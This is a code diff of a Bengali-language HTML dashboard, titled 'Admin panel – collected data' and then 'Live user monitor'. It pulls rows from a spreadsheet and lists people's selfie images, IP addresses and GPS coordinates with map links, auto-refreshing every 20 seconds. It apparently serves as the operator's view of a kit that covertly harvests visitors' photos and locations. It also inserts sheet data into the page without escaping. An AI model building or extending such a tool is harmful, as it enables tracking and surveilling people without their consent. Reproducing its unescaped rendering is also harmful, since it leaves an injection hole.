@@ -3,93 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>অ্যাডমিন প্যানেল - সংগৃহীত ডাটা</title>
+    <title>প্রজেক্ট ডাটা মনিটর - লেটেস্ট ডাটা ফাস্ট</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #eef2f3; padding: 20px; }
-        .container { max-width: 1000px; margin: auto; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        h2 { text-align: center; color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
-        th { background-color: #3498db; color: white; }
-        tr:hover { background-color: #f1f1f1; }
-        .user-img { width: 100px; height: 100px; object-fit: cover; border-radius: 8px; cursor: pointer; transition: 0.3s; border: 1px solid #ccc; }
-        .user-img:hover { transform: scale(2.5); position: relative; z-index: 10; }
-        .gps-link { color: #e74c3c; text-decoration: none; font-weight: bold; }
-        .refresh-btn { display: block; width: 200px; margin: 20px auto; padding: 10px; background: #27ae60; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        :root { --primary: #7928ca; --secondary: #ff0080; --bg: #0b0f1a; --card: #161b22; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg); color: white; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        .header { text-align: center; margin-bottom: 30px; }
+        h2 { background: linear-gradient(to right, var(--primary), var(--secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 28px; }
+        .container { width: 100%; max-width: 1100px; background: var(--card); border-radius: 15px; overflow: hidden; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        table { width: 100%; border-collapse: collapse; text-align: left; }
+        th { background: #21262d; padding: 15px; font-size: 14px; text-transform: uppercase; color: #8b949e; border-bottom: 2px solid #30363d; }
+        td { padding: 15px; border-bottom: 1px solid #30363d; font-size: 14px; color: #c9d1d9; }
+        tr:nth-child(1) td { border-left: 4px solid var(--secondary); background: rgba(255, 0, 128, 0.05); } /* নতুন ডাটা হাইলাইট */
+        .img-box { width: 60px; height: 60px; border-radius: 8px; object-fit: cover; border: 1px solid #444; }
+        .badge { background: #238636; color: white; padding: 4px 8px; border-radius: 5px; font-size: 12px; }
+        .refresh-btn { background: #21262d; color: #c9d1d9; border: 1px solid #30363d; padding: 10px 20px; border-radius: 8px; cursor: pointer; margin-bottom: 15px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>সংগৃহীত ইউজার ডাটা (Live)</h2>
-    <button class="refresh-btn" onclick="fetchData()">ডাটা রিফ্রেশ করুন</button>
-    
-    <table id="dataTable">
-        <thead>
-            <tr>
-                <th>ছবি (Selfie)</th>
-                <th>আইপি (IP Address)</th>
-                <th>লোকেশন (Google Maps)</th>
-            </tr>
-        </thead>
-        <tbody id="tableBody">
+    <div class="header">
+        <h2>📊 লাইভ ইউজার মনিটর</h2>
+        <p style="color: #8b949e;">নতুন ডাটা সবার উপরে দেখাবে</p>
+    </div>
+
+    <button class="refresh-btn" onclick="loadSheetData()">🔄 রিফ্রেশ করুন</button>
+
+    <div class="container">
+        <table>
+            <thead>
+                <tr id="tableHead"></tr>
+            </thead>
+            <tbody id="tableBody">
+                <tr><td colspan="5" style="text-align:center;">ডাটা লোড হচ্ছে...</td></tr>
             </tbody>
-    </table>
-</div>
+        </table>
+    </div>
 
-<script>
-    const apiURL = "https://sheetdb.io/api/v1/ey67387uzrxk5?sheet=Sheet9";
+    <script>
+        const SHEET_ID = '1l_P0T1okUtFiiewiMZyZm6PFLWX5TIBNzGOg-LWK238';
+        const URL = `https://docs.google.com/spreadsheets/d/${SHEET_ID}/gviz/tq?tqx=out:csv&sheet=Sheet9`;
 
-    async function fetchData() {
-        const tableBody = document.getElementById('tableBody');
-        tableBody.innerHTML = "<tr><td colspan='3' style='text-align:center;'>ডাটা লোড হচ্ছে...</td></tr>";
+        async function loadSheetData() {
+            const headRow = document.getElementById('tableHead');
+            const bodyRow = document.getElementById('tableBody');
 
-        try {
-            const response = await fetch(apiURL);
-            const data = await response.json();
+            try {
+                const response = await fetch(URL);
+                const csvText = await response.text();
+                
+                let rows = csvText.split('\n').map(row => 
+                    row.split(/,(?=(?:(?:[^"]*"){2})*[^"]*$)/).map(cell => cell.replace(/^"|"$/g, ''))
+                );
 
-            tableBody.innerHTML = ""; // আগের ডাটা ক্লিয়ার করা
+                if (rows.length < 1) return;
 
-            // ডাটা উল্টো করে দেখানো (নতুন ডাটা আগে আসবে)
-            data.reverse().forEach(row => {
-                const tr = document.createElement('tr');
+                const headers = rows[0];
+                const dyIndex = headers.findIndex(h => h.toLowerCase() === 'dy');
 
-                // ছবির অংশ (Base64 থেকে ছবি তৈরি)
-                const imgTd = document.createElement('td');
-                const img = document.createElement('img');
-                img.src = row.img; // শিট থেকে আসা Base64 স্ট্রিং
-                img.className = "user-img";
-                img.alt = "No Image Found";
-                imgTd.appendChild(img);
+                // হেডার সেট করা
+                headRow.innerHTML = headers
+                    .map((h, index) => index === dyIndex ? '' : `<th>${h}</th>`)
+                    .join('');
 
-                // আইপি অংশ
-                const ipTd = document.createElement('td');
-                ipTd.innerText = row.ip || "N/A";
+                // ডাটা সর্টিং: হেডার বাদে বাকি ডাটাগুলোকে উল্টে (Reverse) দেওয়া
+                const dataRows = rows.slice(1).filter(r => r.length > 1).reverse();
 
-                // জিপিএস অংশ (গুগল ম্যাপস লিংক তৈরি)
-                const gpsTd = document.createElement('td');
-                if (row.gps && row.gps !== "GPS Denied" && row.gps !== "Not Supported") {
-                    const gpsLink = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(row.gps)}`;
-                    gpsTd.innerHTML = `<a href="${gpsLink}" target="_blank" class="gps-link">📍 ম্যাপে দেখুন</a><br><small>${row.gps}</small>`;
-                } else {
-                    gpsTd.innerText = row.gps || "No Data";
-                }
+                bodyRow.innerHTML = "";
+                dataRows.forEach(rowData => {
+                    const tr = document.createElement('tr');
+                    rowData.forEach((cell, index) => {
+                        if (index !== dyIndex) {
+                            const td = document.createElement('td');
+                            if (cell.includes('http')) {
+                                td.innerHTML = `<a href="${cell}" target="_blank"><img src="${cell}" class="img-box"></a>`;
+                            } else if (cell.includes(',')) {
+                                td.innerHTML = `<span class="badge">📍 ${cell}</span>`;
+                            } else {
+                                td.innerText = cell || "N/A";
+                            }
+                            tr.appendChild(td);
+                        }
+                    });
+                    bodyRow.appendChild(tr);
+                });
 
-                tr.appendChild(imgTd);
-                tr.appendChild(ipTd);
-                tr.appendChild(gpsTd);
-                tableBody.appendChild(tr);
-            });
-        } catch (error) {
-            tableBody.innerHTML = "<tr><td colspan='3' style='text-align:center; color:red;'>ডাটা লোড করতে সমস্যা হয়েছে!</td></tr>";
-            console.error("Fetch Error:", error);
+            } catch (error) {
+                console.error("Error:", error);
+                bodyRow.innerHTML = "<tr><td colspan='5' style='text-align:center; color:red;'>ডাটা লোড করতে সমস্যা হয়েছে!</td></tr>";
+            }
         }
-    }
 
-    // পেজ লোড হলে ডাটা ফেচ করা
-    window.onload = fetchData;
-</script>
-
+        loadSheetData();
+        setInterval(loadSheetData, 20000); // ২০ সেকেন্ড পর পর অটো আপডেট
+    </script>
 </body>
-  </html>
-  
+</html>
